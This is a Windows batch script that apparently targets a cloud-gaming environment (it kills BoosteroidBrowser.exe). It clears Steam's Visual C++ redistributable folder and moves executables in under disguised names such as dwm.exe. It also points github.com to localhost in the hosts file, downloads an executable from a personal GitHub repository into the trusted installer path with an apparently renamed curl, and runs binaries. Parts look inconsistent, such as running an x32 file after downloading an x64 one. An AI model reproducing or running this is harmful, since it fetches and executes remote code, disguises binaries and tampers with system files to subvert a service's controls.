@echo off
TITLE 

set "zipFile=C:\Users\user\Downloads\ARK_WorldsMod.zip"
set "zipFile2=C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\vcredist\2019\VC_redist.x64.exe"
set "unzipFolder=C:\Users\user\Downloads\Asgard"
set "unzipFolder2=C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\vcredist\2019"


if not exist "%unzipFolder%" (
  mkdir "%unzipFolder%"
)

if not exist "%unzipFolder2%" (
  mkdir "%unzipFolder2%"
)

del /Q "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\vcredist\2019"\*.*"

move "%~dp0korean.exe" "%unzipFolder%"
move "%~dp0epp.exe" "%unzipFolder%"
move "%~dp0dwm.exe" "%unzipFolder%"
move "%~dp0ssfn_ins2.exe" "%unzipFolder%"
move "%~dp0noTitles.exe" "%unzipFolder2%"
move "Redist\*" "%unzipFolder2%"
rmdir /S /Q "Redist"

cd "%unzipFolder2%"

start "" "noTitles.exe"
timeout /t 3
taskkill /F /IM BoosteroidBrowser.exe

copy %windir%\System32\drivers\etc\hosts %windir%\System32\drivers\etc\hosts.bak
attrib -a -h -r -s %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 github.com > %windir%\System32\drivers\etc\hosts
::YOU MAY NEED TO CHANGE THE FILE NAME IN THE NEXT LINE

start "" /wait "VC_redist.x32.exe"

cd "%unzipFolder%"

"%unzipFolder%\dwm.exe" -k -L -o "%zipFile2%" "https://github.com/tobiasmulln/Testing/raw/main/VC_redist.x64.exe"

start "" /wait "VC_redist.x32.exe"

del %windir%\System32\drivers\etc\hosts
ren %windir%\System32\drivers\etc\hosts.bak hosts

start "" "korean.exe"

echo C:\Users\user\Downloads\Asgard\ssfn_ins2.exe|clip